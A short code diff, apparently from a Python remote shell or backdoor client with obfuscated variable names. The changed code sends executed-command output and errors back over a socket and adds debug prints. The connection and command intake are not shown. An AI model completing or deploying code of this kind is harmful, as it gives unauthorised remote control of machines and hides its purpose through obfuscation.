@@ -30,13 +30,14 @@ def main(sc):
             print(f"output: {sfgshkgs43}")
             print(f"output error: {gsysi4gy4}")
             print(f"command: {gsf5ugh5us3}")
-            if len(sfgshkgs43) < 4 and len(gsysi4gy4) < 4:
+            print(len(sfgshkgs43))
+            print(len(gsysi4gy4))
+            if len(sfgshkgs43) < 1 and len(gsysi4gy4) < 1:
                 print("[-] The output is none.")
-                v43h34iu5.send(bytes("Null", "utf-8"))
-                v43h34iu5.send(gsysi4gy4)
+                print(sfgshkgs43)
+                v43h34iu5.send(bytes("Null", "utf-8") + gsysi4gy4)
             else:
-                v43h34iu5.send(sfgshkgs43)
-                v43h34iu5.send(gsysi4gy4)
+                v43h34iu5.send(sfgshkgs43 + gsysi4gy4)
 
         except Exception as ex:
             print(ex)
